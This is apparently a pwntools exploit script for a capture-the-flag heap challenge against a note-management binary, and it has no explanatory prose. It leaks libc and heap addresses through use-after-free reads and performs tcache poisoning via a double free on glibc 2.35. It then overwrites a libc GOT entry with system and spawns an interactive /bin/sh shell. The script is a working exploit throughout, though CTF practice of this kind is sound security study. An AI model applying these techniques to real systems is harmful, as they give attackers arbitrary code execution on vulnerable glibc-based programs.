#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn5_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("addr", 1337)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x00000000000013BA
            brva 0x00000000000014BA
            brva 0x0000000000001536
            brva 0x0000000000001414
            c
            set follow-fork-mode parent
            ''')

def write_note(idx, size, content):
    p.sendlineafter(b'>> ', str(1))
    p.sendlineafter(b'index : ', str(idx))
    p.sendlineafter(b'size : ', str(size))
    p.sendlineafter(b'content : ', content)

def read_note(idx):
    p.sendlineafter(b'>> ', str(2))
    p.sendlineafter(b'index : ', str(idx))

def delete_note(idx):
    p.sendlineafter(b'>> ', str(3))
    p.sendlineafter(b'index : ', str(idx))

# Make unsorted bin
for i in range(9): # 0 -> 8
    write_note(i, 0x80, f'{i}'.encode()*8)

for i in range(8): # 0 -> 7
    delete_note(i)

# Leak libc
read_note(7)
p.recvuntil(b'content : \n')
libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x21ace0
print("Libc base: " + hex(libc.address))

# Leak heap
read_note(0)
p.recvuntil(b'content : \n')
heap_leak = u64(p.recv(5) + b'\0'*3)
print("Heap leak: " + hex(heap_leak))
heap_base = heap_leak << 12
print("Heap base: " + hex(heap_base))
for i in range(8): # 0 -> 7
    write_note(i, 0x80, f'{i}'.encode()*8)

# Tcache Poisoning libc 2.35
for i in range(9, 10): # 9
    write_note(i, 0x80, f'{i}'.encode()*8)

for i in range(7): # 0 -> 6
    delete_note(i)

# Before free:
# chunk
# unsorted bin

# After free:
# unsorted bin (7 + 8)

delete_note(8)
delete_note(7)
write_note(0, 0x80, b'0'*8) # pointer note[0] = note[8]
# tcache nam trong unsorted by double free
delete_note(8)

# Overwrite puts@got libc -> system
write_note(10, 0x100, b'a'*0x88 + p64(0x91) + p64((libc.address + 0x21a090) ^ ((heap_base + 0x720) >> 12)))

write_note(11, 0x80, b'a'*8)
write_note(12, 0x80, b'/bin/sh\0' + p64(libc.sym['system']))
read_note(12)

p.interactive()